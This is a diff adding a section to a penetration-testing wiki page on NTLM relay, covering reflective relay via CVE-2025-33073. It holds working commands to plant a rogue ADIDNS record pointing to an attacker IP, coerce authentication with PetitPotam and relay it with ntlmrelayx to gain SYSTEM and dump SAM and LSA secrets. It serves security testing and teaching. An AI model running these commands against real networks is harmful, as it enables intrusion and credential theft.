@@ -1,6 +1,6 @@
 ---
 description: MITRE ATT&CK™ Sub-technique T1557.001
-authors: ShutdownRepo, mpgn
+authors: ShutdownRepo, mpgn, PvUL00, ethicxz
 category: ad
 ---
 
@@ -224,6 +224,52 @@ ntlmrelayx.py -t dcsync://'DOMAINCONTROLLER' -auth-smb 'DOMAIN'/'LOW_PRIV_USER':
 :::
 
 
+### Abusing CVE-2025-33073 (Reflective relay)
+
+As demonstrated by Synacktiv in [this blog post](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025), it is also possible to relay an NTLM or Kerberos authentication back to the originating machine (reflective relay) when it comes [from a coercion](../mitm-and-coerced-authentications/index.md).
+
+CVE-2025-33073 ([patched June 2025](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)) abuses ADIDNS to trigger **local NTLM authentication reflection**. By registering a DNS record embedding [marshalled target information](https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html) (e.g. `HOST1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`), `lsasrv!LsapCheckMarshalledTargetInfo` strips the serialized suffix and leaves only the hostname, `HOST1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA` becomes `HOST`. `msv1_0!SspIsTargetLocalhost` then recognizes the target as local, causing the client to include the workstation and domain names in the `NTLM_NEGOTIATE`. When the victim server receives this message with matching names, `msv1_0!SsprHandleNegotiateMessage` sets the `NTLMSSP_NEGOTIATE_LOCAL_CALL` flag in the `NTLM_CHALLENGE`. PetitPotam coerces `lsass.exe` (running as SYSTEM) into authenticating toward the attacker. Upon receiving the challenge with the local call flag, `lsass.exe` copies its SYSTEM access token into the server context. When the attacker relays the `NTLM_AUTHENTICATE` back to the victim, the server retrieves that token and impersonates it, granting `NT AUTHORITY\SYSTEM` over SMB. By default [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) will then [dump the SAM and the LSA secrets](../credentials/dumping/sam-and-lsa-secrets.md) of the target host.
+
+> [!TIP]
+> Verify that the target does not enforce SMB signing beforehand: 
+>```bash
+>netexec smb "$RANGE" --gen-relay-list targets.txt
+>```
+>
+> If SMB signing is enforced, exploitation may still be possible by relaying over HTTP instead. For instance if [ADCS](../adcs/) is installed (relay to the Web Enrollment endpoint via [ESC8](../adcs/unsigned-endpoints#web-endpoint-esc8)).
+
+1. First of all, register the specific DNS record pointing to the attacker's IP. In this reflective relay, the coerced machine and the relay target are the same, use the NetBIOS name of **the victim machine**. This can be performed with [dnstool.py](https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py) (Python):
+
+```bash
+# Create a rogue ADIDNS record pointing to the attacker's IP:
+dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" "$DC_IP" --action add -r "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" -d "$ATTACKER_IP"
+```
+
+2. Then, trigger an authentication coerce (for example, with [PetitPotam](../mitm-and-coerced-authentications/ms-efsr.md)) from the target to the DNS record, and relay the authentication with [ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py) (Python).
+
+```bash
+# In a first terminal, ntlmrelayx waiting for an authentication to relay
+ntlmrelayx.py -t smb://"$TARGET_FQDN" -smb2support
+
+# Coerce the victim to authenticate toward the rogue hostname (e.g. with PetitPotam):
+petitpotam.py -u "$USER" -p "$PASSWORD" -d "$DOMAIN" "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "$TARGET_FQDN"
+```
+
+> [!CAUTION]
+> Clean up the rogue DNS record after the test: 
+>```bash
+>dnstool.py -u "$DOMAIN"\\"$USER" -p "$PASSWORD" --action remove --record "[TARGET_NETBIOS]1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA" "$DC_IP"
+>```
+
+> [!NOTE]
+> A single DNS record can be registered to target **any** vulnerable machine: `localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA`. Once the serialized target info is stripped, only `localhost` remains, causing the loopback check in `msv1_0!SspIsTargetLocalhost` to succeed regardless of the target's hostname.
+
+> [!NOTE]
+> The patch was released on June 2025 Patch Tuesday. The list of affected versions and corresponding KBs is available on the [Microsoft Security Response Center](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073).
+
+---
+
+
 ### Tips & tricks :bulb:
 
 The ntlmrelayx tool offers features making it a very valuable asset when pentesting an Active Directory domain:
@@ -283,3 +329,7 @@ The ntlmrelayx tool offers features making it a very valuable asset when pentest
 [http://davenport.sourceforge.net/ntlm.html](http://davenport.sourceforge.net/ntlm.html)
 
 [https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022](https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022)
+
+[https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
+
+[https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html](https://projectzero.google/2021/10/using-kerberos-for-authentication-relay.html)
